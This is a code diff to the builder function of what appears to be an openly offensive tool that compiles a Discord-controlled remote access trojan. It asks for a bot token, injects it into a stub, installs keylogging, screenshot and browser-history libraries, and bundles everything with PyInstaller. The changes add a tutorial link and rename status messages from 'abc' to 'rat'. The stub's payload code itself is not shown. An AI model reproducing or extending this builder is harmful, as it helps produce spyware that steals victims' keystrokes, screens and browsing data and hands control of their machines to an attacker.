@@ -1,12 +1,17 @@
 import os, sys, subprocess, shutil, time, traceback
 from core.display import Colors, Colorate, get_inpt, Theme, print_banner
+import webbrowser
 
 def rat_builder_init():
     _cl = Theme.get_colors()
     print_banner()
     print(Colorate.Horizontal(_cl["head"], "  [ RAT BUILDER ]\n"))
 
-    token = get_inpt("Enter Discord Bot Token:")
+    tutorial = get_inpt("Do you need a tutorial? (y/n): ").strip().lower()
+    if tutorial == "y":
+        webbrowser.open("https://www.youtube.com/watch?v=3dvv1wNfrsQ")
+
+    token = get_inpt("Enter Discord Bot Token: ")
     if not token:
         print(Colorate.Horizontal(_cl["num"], "  [!] No token provided. Aborting."))
         time.sleep(2)
@@ -49,12 +54,12 @@ def rat_builder_init():
         with open(temp_stub, "w", encoding="utf-8") as f:
             f.write(content)
 
-        print(Colorate.Horizontal(_cl["head"], "  [+] Token injected into abc."))
+        print(Colorate.Horizontal(_cl["head"], "  [+] Token injected into rat."))
 
         print(Colorate.Horizontal(_cl["txt"], "  [*] Preparing dependencies..."))
         subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller", "comtypes", "pycaw", "pyautogui", "browserhistory", "mss", "pynput", "discord.py", "requests", "pywin32", "-q"])
 
-        print(Colorate.Horizontal(_cl["txt"], "  [*] Compiling abc (Bundling all modules)..."))
+        print(Colorate.Horizontal(_cl["txt"], "  [*] Compiling rat (Bundling all modules)..."))
         
         output_dir = os.path.join(os.getcwd(), "output")
         if not os.path.exists(output_dir): 
